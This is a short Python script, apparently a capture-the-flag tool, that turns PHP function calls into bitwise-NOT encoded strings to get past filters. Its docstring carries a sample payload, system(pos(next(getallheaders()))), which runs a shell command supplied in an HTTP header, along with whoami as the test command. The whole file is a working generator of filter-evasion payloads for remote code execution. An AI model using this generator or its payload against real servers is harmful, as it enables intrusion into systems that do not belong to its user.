
def one(s):
    ss = ""
    for each in s:
        ss += "%" + str(hex(255 - ord(each)))[2:].upper()
    return f"[~{ss}][!%FF]("

"""
system(pos(next(getallheaders())));
a=whoami
"""
while 1:
    a = input(":>").strip(")")
    aa = a.split("(")
    s = ""
    for each in aa[:-1]:
        s += one(each)
    s += ")" * (len(aa) - 1) + ";"
    print(s)
